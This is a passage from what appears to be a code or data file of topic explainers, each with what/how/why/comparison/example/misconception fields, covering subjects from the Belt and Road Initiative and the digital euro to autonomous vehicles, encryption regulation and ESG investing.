    "vs": "compared with energy scarcity (substitutable), water has no substitute and limited transportability. Compared with food shortages, water shortages can persist for years before recovery. Compared with droughts (temporary), structural scarcity reflects long-term imbalance",
    "ex": "Cape Town, South Africa nearly hit 'Day Zero' (taps running dry) in 2018, narrowly averted through aggressive conservation. The Colorado River system serves 40 million people across 7 US states and parts of Mexico; Lake Mead and Lake Powell hit historic lows in 2022, prompting first-ever federal water cuts. Mexico City's aquifer depletion causes the city to sink up to 50 cm/year",
    "mis": "people think bottled water is the issue; agriculture and industry use vastly more water. Another myth is that desalination solves scarcity universally -- it works for coastal cities with capital but is expensive and energy-intensive, not viable for inland regions or large agricultural needs",
}
T["the Belt and Road Initiative"] = {
    "what": "China's global infrastructure program announced in 2013 to build ports, railways, highways, energy projects, and digital networks across Asia, Africa, Europe, and Latin America. By 2024, BRI has involved over 150 countries and $1 trillion+ in investments and loans, reshaping global infrastructure financing",
    "how": "Chinese state-owned enterprises and policy banks (Export-Import Bank of China, China Development Bank) finance projects, often with Chinese contractors and equipment. Recipients gain infrastructure they couldn't otherwise afford; China gains commercial relationships, geopolitical influence, and access to resources and markets",
    "why": "BRI represents the largest infrastructure investment program in history, reshaping trade routes (China-Europe rail, Maritime Silk Road), political relationships (debt diplomacy concerns), and the global balance between Chinese and Western infrastructure financing. Western alternatives (US Build Back Better World, EU Global Gateway) emerged in response",
    "vs": "compared with Western development financing (World Bank, IMF), BRI emphasizes infrastructure and operates with looser governance conditions. Compared with bilateral aid, BRI is largely commercial -- loans rather than grants, with conditions favoring Chinese contractors. Recent shifts have moved BRI toward smaller, greener projects after early debt-distress controversies",
    "ex": "the China-Pakistan Economic Corridor ($60+ billion, including Gwadar port and energy projects), Mombasa-Nairobi Standard Gauge Railway in Kenya ($3.6 billion, completed 2017), Hambantota Port in Sri Lanka (taken over by China after Sri Lankan debt default, exemplifying 'debt trap' concerns). Hundreds of smaller projects span the Global South",
    "mis": "people think BRI is all 'debt trap diplomacy'; most loans are repaid normally, and reset cases vary. Another myth is that BRI is purely strategic -- it includes commercial logic, with returns expected on financial investments. Effectiveness varies by project and country",
}
T["the digital euro and CBDCs"] = {
    "what": "the European Central Bank's project to develop a retail digital euro -- a digital form of central bank money for everyday payments. Following years of investigation, the ECB began the preparation phase in late 2023, targeting potential issuance in the late 2020s. Pilots and design choices are ongoing",
    "how": "the proposed digital euro would be issued by the Eurosystem, distributed through banks and payment service providers, and accessible via apps or cards for retail payments. Designs prioritize privacy (pseudonymous for low-value, identified for high-value), offline capability, and bank disintermediation safeguards (holding limits)",
    "why": "the ECB cites supporting payment sovereignty (reducing dependence on US-based payment networks), modernizing public money for the digital era, and providing a public alternative to private digital payments and stablecoins. Critics worry about commercial bank impacts, surveillance, complexity, and lack of clear consumer demand",
    "vs": "compared with cash, digital euros enable digital convenience but reduce anonymity. Compared with bank deposits, they are central bank liabilities with no credit risk but lack payment of interest. Compared with private digital payments (Visa, PayPal), digital euros are public infrastructure. Compared with stablecoins, digital euros are sovereign issuance with explicit policy goals",
    "ex": "digital euro pilots include settlement testing with major banks, distance-payment trials, and integration with existing payment infrastructure. The ECB's 2024 progress report outlined design choices on holding limits (likely a few thousand euros per person) and intermediary models. Final political authorization remains pending in EU institutions",
    "mis": "people fear the digital euro as inevitable surveillance tool; design proposals include strong privacy for small payments. Another myth is that the digital euro replaces cash; the ECB has consistently said cash will continue alongside",
}
T["generative AI in creative industries"] = {
    "what": "the use of AI to generate text, images, video, music, and code. Generative AI has rapidly transformed many creative workflows since 2022 -- marketing copy, illustration, software, music, even film. The disruption raises questions about authorship, copyright, labor, and economic value of creative work",
    "how": "models like GPT-4, Claude, Midjourney, DALL-E, Stable Diffusion, Suno, Sora, and many others generate outputs from text prompts. They are trained on vast corpora that include copyrighted works, the legality of which is being litigated. Practitioners use them for ideation, drafting, asset generation, and increasingly final outputs",
    "why": "generative AI shifts the economics of creative production: faster iteration, lower marginal cost, broader accessibility for non-experts. It also disrupts labor markets (illustrators, voice actors, copywriters, junior coders) and challenges existing copyright and licensing frameworks. The 2023 Hollywood writers' and actors' strikes included AI as a central issue",
    "vs": "compared with traditional creative tools, generative AI produces complete drafts from prompts rather than aiding individual operations. Compared with stock libraries, AI generates on-demand content. Compared with human creators, AI is faster and cheaper for many uses but lacks lived experience, judgment, and accountability that human work provides",
    "ex": "an indie game studio uses Midjourney for concept art, Suno for music, GPT-4 for dialogue first drafts, and human artists/musicians for polish. Total production cost drops 50%+ vs traditional pipelines. Major studios face pushback from unions over AI replacing human work; settled contracts include guardrails but disputes continue",
    "mis": "people think AI will replace human creativity entirely; creative human direction, taste, and original perspective remain essential to high-value work. Another myth is that AI-generated content is automatically infringing -- the legal status varies by jurisdiction and is being litigated, with no clear universal rule yet",
}
T["AI-assisted scientific discovery"] = {
    "what": "the use of AI to accelerate scientific research, from hypothesis generation to experimental design to data analysis. Examples include AlphaFold for protein structures, materials discovery via ML, AI-driven literature analysis, and laboratory automation guided by AI",
    "how": "AI augments researchers in many ways: predicting molecular properties, screening millions of candidate compounds, analyzing massive datasets faster than human researchers, and proposing experiments. Self-driving labs combine AI with robotics to run, observe, and decide on experiments without continuous human oversight",
    "why": "scientific productivity has been slowing in many fields (Bloom et al. 2020 estimates research productivity dropped by half each ~13 years in some areas). AI tools may reverse this. Drug discovery, materials science, climate modeling, and basic physics have all seen AI-assisted breakthroughs",
    "vs": "compared with traditional experimental approaches, AI dramatically expands the search space examined per unit of time and money. Compared with simulation alone, AI integrates with experiment to refine predictions. Compared with replacing scientists, AI most often augments their judgment with faster iteration cycles",
    "ex": "DeepMind's AlphaFold predicted structures for 200M+ proteins (the AlphaFold Database, 2022), accelerating biology research. AI-designed antibiotic 'halicin' was identified via ML screening of 100M+ molecules. Particle physicists use ML to identify rare events in vast LHC data. ML-discovered materials with target properties (battery cathodes, photovoltaics) are entering laboratories",
    "mis": "people think AI will autonomously make scientific breakthroughs; current AI is a powerful tool that requires expert direction and validation. Another myth is that AI replaces the need for experiments -- experiments remain essential to validate AI predictions and ground-truth the models",
}
T["autonomous vehicles"] = {
    "what": "vehicles capable of operating without human drivers in some or all conditions. The SAE defines 6 levels (0-5); commercially deployed AVs are mostly Level 4 (driverless in geofenced areas) like Waymo's robotaxi service. Tesla's Full Self-Driving operates as Level 2+ requiring driver supervision. Level 5 (anywhere, anytime) remains unrealized",
    "how": "AVs combine cameras, radar, lidar (most), GPS, and inertial sensors with neural networks for perception, mapping, and planning. They predict the behavior of other road users, plan trajectories, and execute control. Detailed HD maps and remote operations support edge cases. Cumulative real-world driving data trains and validates the systems",
    "why": "AVs could reduce crashes (most caused by human error), expand mobility for non-drivers, reshape urban planning, and disrupt taxi, trucking, and delivery industries. Investment has been enormous over a decade, with progress slower than initial expectations but Waymo, Cruise (paused), Zoox, and Chinese competitors operating commercial robotaxi services in 2024-2026",
    "vs": "compared with human driving, AVs are more consistent but currently weaker on rare edge cases (construction zones, weather, unusual scenarios). Compared with driver-assistance systems, full AVs accept full operational responsibility. Geographic and weather constraints remain significant -- AVs struggle most in rain, snow, and complex urban environments",
    "ex": "Waymo operates fully driverless robotaxi services in Phoenix, San Francisco, Los Angeles, and Austin (~150K rides per week by mid-2024). Cruise paused operations after a 2023 incident, illustrating regulatory and trust risks. Tesla's FSD operates as a supervised system; Tesla aims for unsupervised operation but timelines have slipped repeatedly",
    "mis": "people think Level 5 AVs are imminent; the long tail of edge cases makes anywhere-anytime operation hard. Another myth is that AVs will instantly replace human drivers -- the rollout is progressing geography by geography, vehicle category by category, over decades",
}
T["delivery drones"] = {
    "what": "small uncrewed aerial vehicles used for delivering packages, food, medical supplies, and other goods. Commercial deployments include Amazon Prime Air, Wing (Alphabet), Zipline (medical supplies in Africa and US), and various Chinese companies. Regulation, range, and economics shape what's commercially viable",
    "how": "drones launch from local depots, navigate via GPS and onboard sensors to delivery addresses, and deposit packages by hover-and-drop or precise landing. Most operate within visual line-of-sight or with detect-and-avoid systems for beyond-visual-line-of-sight (BVLOS). Battery life limits range; payload capacity is typically 1-5 kg",
    "why": "drone delivery offers fast last-mile service, especially valuable for time-critical items (medical supplies, urgent food orders) and hard-to-reach locations. Zipline has delivered millions of medical packages in Rwanda and Ghana. Urban use is more constrained by safety, noise, and airspace integration challenges",
    "vs": "compared with ground delivery, drones bypass road traffic and reach remote areas faster. Compared with helicopters, drones are vastly cheaper and lower-impact. Compared with mature delivery infrastructure, drones face regulatory hurdles, higher per-package cost in dense areas, and weather constraints",
    "ex": "Zipline's medical drone delivery in Rwanda has handled over 1 million deliveries, dropping blood and vaccines to remote clinics in minutes vs hours/days by road. Wing operates commercial drone delivery for retail in Australia and select US locations. Amazon Prime Air launched limited service in California and Texas in 2022-2024",
    "mis": "people think drone delivery will replace ground delivery widely; drones suit specific use cases (light, urgent, remote) more than general parcel delivery. Another myth is that regulation is the only obstacle -- economics, weather, noise, and integration with crewed aviation all matter as deployments scale",
}
T["the metaverse"] = {
    "what": "envisioned persistent, immersive virtual worlds where people work, socialize, game, and transact. Proponents (Meta, Epic, Apple) imagine seamless 3D experiences across devices; critics see hype detached from user demand. By 2026, VR adoption is growing modestly; mainstream metaverse adoption remains aspirational",
    "how": "current implementations use VR headsets (Meta Quest 3, Apple Vision Pro, PSVR2), AR glasses (early-stage), and 3D web/games. Persistent virtual worlds host avatars, virtual goods, and economic activity. Interoperability between platforms is limited despite ambitions for cross-world identity and assets",
    "why": "Meta has invested over $50 billion in metaverse and Reality Labs since 2019. Apple's Vision Pro (2024) marketed 'spatial computing'. Use cases include gaming, virtual collaboration, training, and experiences not possible in physical space. Adoption remains far below initial projections; hardware costs, content limitations, and use case clarity all constrain growth",
    "vs": "compared with traditional gaming, metaverse aims for persistent shared social spaces. Compared with video calling, immersive virtual presence offers richer body language and spatial cues. Compared with the 2D web, the metaverse adds 3D and embodiment but loses some of the speed and accessibility of flat interfaces",
    "ex": "VRChat hosts millions of monthly users in a fully social VR world. Roblox has 70M+ daily users, especially among kids. Apple's Vision Pro launched in 2024 at $3500 -- impressive technology but small initial sales. Meta's Horizon Worlds remains lightly populated. Niche professional use (training, design review, virtual collaboration) is growing",
    "mis": "people think 'metaverse' has a single canonical form; it's more an aspiration than a defined product. Another myth is that the metaverse is dead because of Meta's losses -- VR/AR adoption continues incrementally, just slower than maximalist projections",
}
T["decentralized social media"] = {
    "what": "social platforms that distribute control over identity, content, and moderation across many independent servers or networks rather than concentrating it in a single corporation. Examples include Mastodon (ActivityPub protocol), Bluesky (AT Protocol), Nostr, and Farcaster",
    "how": "ActivityPub federates many independent servers (instances): users on different instances can follow each other across the network. AT Protocol (Bluesky) takes a slightly different approach with portable identity and pluggable algorithms. Nostr uses cryptographic identities that aren't tied to any server. Each design tradesoff control, ease of use, and governance",
    "why": "decentralized platforms emerged in response to concerns over Twitter's policies, Meta's algorithmic incentives, and platform-driven outcomes (misinformation, polarization). They give users more control over moderation, algorithms, and data. Adoption is meaningful but small relative to mainstream platforms",
    "vs": "compared with Twitter/X, decentralized networks lack the same network effects and revenue-generating features. Compared with each other, ActivityPub is more mature with more users, AT Protocol offers a middle ground of decentralization and usability, Nostr is more crypto-aligned. Network effects favor incumbents; decentralized protocols depend on slow-burn adoption",
    "ex": "Mastodon usage spiked after Elon Musk's 2022 Twitter acquisition and again after policy changes; current monthly active users are over a million across thousands of instances. Bluesky reached over 20 million users by mid-2024 after invite gating ended. Threads (Meta's product) added ActivityPub federation in 2024",
    "mis": "people think decentralized social media will quickly replace Twitter; network effects are powerful and adoption is gradual. Another myth is that decentralization eliminates moderation challenges -- moderation still happens, but at the instance level rather than platform-wide, raising different tradeoffs",
}
T["end-to-end encryption regulation"] = {
    "what": "policy debates over whether and how to restrict end-to-end encryption (E2EE) -- which prevents service providers and third parties from reading users' messages. Regulatory tensions exist between privacy advocates (favoring strong E2EE) and law enforcement (concerned about loss of access for investigations)",
    "how": "E2EE encrypts messages on the sender's device and decrypts only on the recipient's, with keys not held by service providers. Proposed regulatory responses include client-side scanning (proposed in EU CSA Regulation, UK Online Safety Act), key escrow (decryption keys held by trusted parties), and lawful access mandates (requiring providers to enable government access)",
    "why": "the debate balances privacy (E2EE protects users from surveillance, hackers, and abuse), child safety (some advocate scanning to detect CSAM), national security (concerns about terrorism and crime communications), and digital sovereignty. Apple's 2021 client-side scanning proposal (paused after backlash) and the EU's ongoing CSAR debate illustrate the tensions",
    "vs": "compared with no encryption, E2EE protects against hackers, ISPs, and platforms reading messages. Compared with provider-held encryption, E2EE protects against the provider being compelled to share data. Client-side scanning attempts to enable detection without weakening encryption in transit, but introduces its own surveillance risks",
    "ex": "the UK's Online Safety Act passed in 2023 contains provisions allowing Ofcom to require message scanning, but the government acknowledged the technology to do this without breaking E2EE 'doesn't yet exist'. Signal and WhatsApp have said they would withdraw from the UK rather than break E2EE. The EU's CSA Regulation remains contested as of 2025",
    "mis": "people think police can't investigate without breaking encryption; modern investigations rely on metadata, device seizure, and undercover work, not just content access. Another myth is that 'lawful access' backdoors stay limited to authorized use -- security researchers consistently warn that intentional weaknesses can be exploited by anyone",
}
T["online age verification debates"] = {
    "what": "policy debates over requiring online platforms to verify users' ages, especially for restricting minors from social media, adult content, and other age-restricted online activities. Multiple US states have passed age verification laws for adult sites and social media; the EU and UK have implemented or proposed similar measures",
    "how": "age verification methods include uploading ID, biometric age estimation (facial analysis), credit card verification, and third-party age checks. Each method has accuracy, privacy, and accessibility tradeoffs. Implementation creates friction and privacy concerns, especially for adults who must verify routinely",
    "why": "the debate balances child safety (preventing exposure to harmful content), privacy (avoiding surveillance and data exposure), and free speech (avoiding chilling effects on adult speech). The US Supreme Court is hearing challenges to age verification laws; courts in 2024-2025 have been split",
    "vs": "compared with content moderation alone, age verification adds upstream gatekeeping. Compared with parental controls, mandated age verification operates at the platform/site level rather than the household. Different verification methods (ID upload, age estimation) have different accuracy and privacy profiles",
    "ex": "Texas's HB 1181 requires age verification for adult sites; Pornhub blocked access to Texas (and several other states) rather than implement. Australia is implementing under-16 social media restrictions in 2025+. The UK's Online Safety Act requires 'highly effective' age assurance for sites publishing pornography",
    "mis": "people think age verification reliably blocks under-18 access; VPNs, shared accounts, and circumvention undermine effectiveness. Another myth is that the technology is mature -- accurate verification methods either depend on government ID (privacy concerns) or have meaningful error rates",
}
T["misinformation and platform moderation"] = {
    "what": "the challenge of addressing false or misleading information on online platforms, balancing accuracy, free expression, and platform liability. Major issues include health misinformation (COVID, vaccines), election misinformation, deepfakes, and coordinated inauthentic behavior. Platform policies have shifted across the 2020s",
    "how": "platforms employ automated detection (ML classifiers), human reviewers, fact-check partnerships, labeling/contextual notes (Twitter/X Community Notes, Meta's third-party fact-checks), demotion in algorithmic feeds, and removal of policy-violating content. Approaches vary widely by platform and have shifted with leadership and political pressure",
    "why": "misinformation impacts public health, election integrity, and social trust. The 2020 election, COVID, January 6, and other events spotlighted platforms' role. The political backlash to moderation (claims of censorship) has reshaped policies; Twitter's transformation under Musk and Meta's Community Notes shift in 2025 reflect changing approaches",
    "vs": "compared with traditional media (with editorial responsibility), platforms historically claimed neutral conduit status under Section 230. Compared with content removal, contextual labeling preserves access while flagging concerns. Compared with algorithmic demotion, removal eliminates content but is more contested",
    "ex": "Twitter's Community Notes (formerly Birdwatch) allows users to add context to misleading tweets, with notes shown when users from diverse perspectives find them helpful. Meta announced in early 2025 it would replace third-party fact-checking in the US with a Community Notes-style system, citing concerns over fact-checker bias",
    "mis": "people think misinformation policies are simple; the line between misinformation and contested speech is genuinely difficult. Another myth is that platforms can fully prevent misinformation -- volume, speed, and adversarial behavior make complete prevention infeasible; the choice is what tradeoffs to accept",
}
T["the future of content moderation"] = {
    "what": "the evolving practice of governing what content appears on online platforms. Recent shifts include reduced trust-and-safety teams at major platforms, integration of LLMs into moderation, regulatory pressure (EU DSA, UK Online Safety Act), and ongoing debates over centralized vs decentralized approaches",
    "how": "platforms use a mix of automated detection (LLMs increasingly applied), human review, user reports, contextual labels, and platform-level policies. Transparency reports document removals; appeals processes handle contested decisions. Federation and decentralization (Mastodon, Bluesky) push moderation to the instance/community level",
    "why": "content moderation shapes public discourse, affects safety for marginalized users, and determines platform liability. Regulatory frameworks impose increasing structure (EU DSA's risk assessments, transparency requirements). Costs of moderation are high; AI-assisted approaches reduce them but introduce errors and biases",
    "vs": "compared with hands-off approaches (4chan, anonymous forums), modern platforms apply substantial moderation. Compared with full curation (traditional media), platforms operate at scale that requires algorithmic and crowd-sourced approaches. Compared with each other, X and Meta have shifted toward less hands-on moderation; Reddit and Discord have community-level moderation by design",
    "ex": "the EU Digital Services Act (in force 2024) requires very large platforms to assess systemic risks, publish transparency reports, and provide alternatives to algorithmic feeds. UK Online Safety Act creates duties of care. US debates focus on Section 230 reform and First Amendment limits on government pressure -- post-2024 election dynamics shape the landscape further",
    "mis": "people think there's a 'right' answer to content moderation; tradeoffs are unavoidable, and reasonable people disagree on weights. Another myth is that AI fully solves moderation at scale -- it helps with volume but creates new errors, false positives, and adversarial dynamics",
}
T["degrowth economics"] = {
    "what": "an economic framework that questions the centrality of GDP growth, especially in already-wealthy economies. Degrowth argues that endless growth on a finite planet is impossible and that well-being can improve through reducing material throughput, redistributing wealth, and prioritizing care, community, and ecology",
    "how": "policy proposals include shorter working weeks, basic income, caps on resource extraction, taxation of luxury and high-emission consumption, public investment in care and ecology, and reframing economic success around well-being rather than GDP. Implementation would require deep institutional change",
    "why": "degrowth gained attention as climate change, biodiversity loss, and material throughput challenge growth-as-usual. The IPCC's AR6 referenced degrowth in scenarios. Critics argue degrowth is politically infeasible and would harm the poor; proponents argue it's the only path consistent with planetary boundaries",
    "vs": "compared with green growth (decoupling growth from environmental impact), degrowth is skeptical that absolute decoupling at the necessary scale is possible. Compared with steady-state economics (no quantitative growth), degrowth specifically calls for planned reduction in rich countries' material throughput. Most mainstream economics still assumes growth as a key indicator",
    "ex": "Spain's coalition government included degrowth-influenced figures; Catalonia and parts of Latin America have piloted post-growth policies (community currencies, time banks, basic income trials). Major mainstream policy adoption remains rare. Bhutan's Gross National Happiness index is an alternative framework that influenced degrowth thinking",
    "mis": "people think degrowth means recession or austerity; advocates frame it as planned, equitable reduction in material throughput while improving lives. Another myth is that degrowth applies globally -- many proponents focus on rich countries reducing while poorer countries continue developing",
}
T["modern monetary theory"] = {
    "what": "a heterodox macroeconomic framework arguing that monetary-sovereign governments (those issuing their own fiat currency) are not financially constrained by tax revenue or borrowing in the way households are. MMT holds that inflation, not solvency, is the main constraint on government spending in such economies",
    "how": "central tenets include: governments create money by spending, destroy money by taxing; tax obligations create demand for the currency; deficits are not inherently inflationary if real resources are available; full employment can be achieved via job guarantees. MMT distinguishes the financial constraints of monetary-sovereign governments from those of states, households, and Eurozone members (which lack their own currencies)",
    "why": "MMT shaped Democratic policy debates in the late 2010s and informed COVID-era stimulus arguments. The 2021-2024 inflation period intensified debates about MMT's policy implications and limits. Whether mainstream macro shifts further toward or away from MMT depends partly on how post-COVID inflation is interpreted",
    "vs": "compared with mainstream macroeconomics (which acknowledges fiat currency but treats fiscal solvency as a meaningful constraint), MMT places much more emphasis on real-resource constraints and policy choices. Compared with hard-money or austerity-focused views, MMT is much more permissive of deficits in non-inflationary conditions",
    "ex": "Stephanie Kelton's 'The Deficit Myth' (2020) popularized MMT for general audiences. The COVID-era US fiscal response ($5T+ across CARES Act, ARP, etc.) without immediate sovereign-debt crisis was cited by MMT proponents as supporting their framework. The subsequent inflation surge was cited by critics as showing limits",
    "mis": "people think MMT means 'spend without limits'; MMT explicitly identifies inflation as the binding constraint. Another myth is that MMT is universally accepted on the left or rejected on the right -- views vary, and MMT has critics across the political spectrum",
}
T["shareholder vs stakeholder capitalism"] = {
    "what": "two competing views of corporate purpose. Shareholder capitalism (Milton Friedman's classical view) holds that corporations exist to maximize shareholder value within legal and ethical constraints. Stakeholder capitalism argues corporations should serve multiple stakeholders -- shareholders, employees, customers, communities, environment",
    "how": "in practice, US corporate governance operates closer to shareholder primacy with increasing stakeholder considerations. The 2019 Business Roundtable statement (181 CEOs) committed to stakeholder capitalism. ESG investing applies stakeholder lenses; benefit corporations and B Corp certifications formalize stakeholder commitments. Corporate strategy increasingly considers human capital, climate, and community",
    "why": "the debate shapes corporate behavior, regulation, and employee/community welfare. The post-2008 environment, climate change, and growing inequality have intensified scrutiny of shareholder-maximization. The 2020s anti-ESG backlash from some investors and politicians has created counter-pressure",
    "vs": "compared with shareholder capitalism, stakeholder approaches consider non-shareholder welfare more explicitly. Compared with regulatory mandates, stakeholder capitalism is voluntary corporate self-governance, criticized as marketing without enforcement. Compared with European stakeholder traditions (codetermination, works councils), US stakeholder capitalism remains weaker institutionally",
    "ex": "Patagonia's 2022 announcement that founder Yvon Chouinard transferred ownership to a trust dedicated to environmental work exemplifies stakeholder commitment. Major asset managers (BlackRock) emphasize ESG factors but face political pressure (anti-ESG laws in Texas, Florida). Public companies must balance investor pressure for short-term returns against long-term stakeholder considerations",
    "mis": "people frame the debate as binary; in practice corporations operate on a spectrum. Another myth is that stakeholder capitalism contradicts shareholder value -- many argue that long-term shareholder value requires consideration of employees, customers, and community",
}
T["ESG investing critique"] = {
    "what": "the practice of integrating Environmental, Social, and Governance factors into investment decisions, and the growing critique of ESG's effectiveness, transparency, and political implications. ESG assets reached ~$30T globally before pulling back amid critique in 2023-2024",
    "how": "ESG investing uses ESG ratings (MSCI, Sustainalytics) to score companies; integrates ESG into stock selection, exclusion lists (no fossil fuels, weapons), and engagement (proxy voting, shareholder resolutions). Major asset managers offer ESG funds; many corporate disclosures now include ESG metrics",
    "why": "ESG aimed to align investing with broader social and environmental goals while delivering returns. Critics argue ESG ratings are inconsistent (Tesla rated badly by some, well by others), greenwashing is rampant, and ESG funds often underperform without delivering measurable impact. Political backlash in the US has framed ESG as ideological",
    "vs": "compared with traditional investing, ESG aims for both returns and broader impact. Compared with impact investing (explicitly seeking measurable social/environmental outcomes), ESG is broader and often more about risk management. Compared with divestment movements, ESG often emphasizes engagement and influence rather than exclusion",
    "ex": "BlackRock's Larry Fink moved from championing ESG (2018-2022) to dialing back the language amid political pressure. Major asset managers have lost mandates from Republican-led states' pension funds. Some funds have rebranded away from 'ESG' to terms like 'sustainable' or 'transition'. The fundamental debate -- can investing improve outcomes while delivering returns -- continues",
    "mis": "people think ESG is uniformly noble or uniformly empty marketing; in reality some ESG investing is rigorous and impactful, some is performative. Another myth is that ESG funds always underperform -- evidence is mixed and varies by methodology, fund, and time period",
}



